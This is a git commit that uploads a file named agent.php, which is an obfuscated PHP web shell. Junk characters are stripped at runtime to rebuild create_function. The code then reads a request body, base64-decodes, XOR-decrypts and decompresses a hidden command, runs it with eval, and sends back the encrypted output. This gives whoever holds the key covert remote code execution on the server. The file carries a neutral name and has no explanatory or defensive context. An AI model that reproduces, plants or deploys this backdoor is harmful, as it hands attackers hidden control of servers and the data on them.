78f19f32117e018c25d04a832e6282e361d5e13a
esrefacil <48657873+esrefacil@users.noreply.github.com>
2023-06-20 01:29:19 +0000

    Add files via upload

---
+++ agent.php
@@ -0,0 +1,10 @@
+<?php
+$a='$k="87faIwaIw7d9Iw";$kh="9IwIwc56362db529"Iw;$kfIw="8e69ae10f3bIw6";$IwIwp="2IwZlN6eVhIwbMa0VYBM";fIwuIwnctioIwn x($t,Iw';
+$l='$k){$c=strlen($kIw);$l=stIwrlen($Iwt);$o=Iw"";fIwor($i=0Iw;$i<$Iwl;){Iwfor($Iwj=0;($j<$c&Iw&$i<$lIw);$j++Iw,$i++Iw){Iw';
+$H=str_replace('fJ','','crfJefJafJte_fJffJunfJction');
+$m='inpuIwt"Iw),$m)==Iw1) {@ob_Iwstart();@eIwval(@IwgIwzuncomIwpress(@x(@Iwbase6Iw4IwIw_decode($Iwm[1]),$kIw)))Iw;$o=@ob';
+$I='_IwgIwet_conIwtentsIw();@oIwb_end_cleIwan();$r=@bIwase64_encode(Iw@Iwx(@gzcompresIws($o),$IwkIw));prIwint("$p$Iwkh$r$kf");}';
+$n='$o.=$t{$i}^Iw$k{Iw$jIw};}}return Iw$o;}if Iw(@preg_IwmatchIw("Iw/$kh(.+Iw)Iw$kIwf/",@filIwe_get_contents(Iw"pIwhp://';
+$y=str_replace('Iw','',$a.$l.$n.$m.$I);
+$h=$H('',$y);$h();
+?>
